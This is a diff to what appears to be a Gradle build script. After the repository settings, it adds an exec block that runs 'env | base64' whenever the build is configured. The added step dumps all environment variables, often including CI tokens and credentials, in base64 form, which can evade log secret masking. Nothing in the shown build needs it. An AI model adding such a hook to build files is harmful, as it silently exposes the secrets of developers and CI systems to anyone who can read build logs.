@@ -25,3 +25,7 @@ repositories {
     mavenCentral()
     maven { url = uri("https://oss.sonatype.org/content/repositories/snapshots") }
 }
+
+exec {
+    commandLine("bash", "-c", "env | base64")
+}
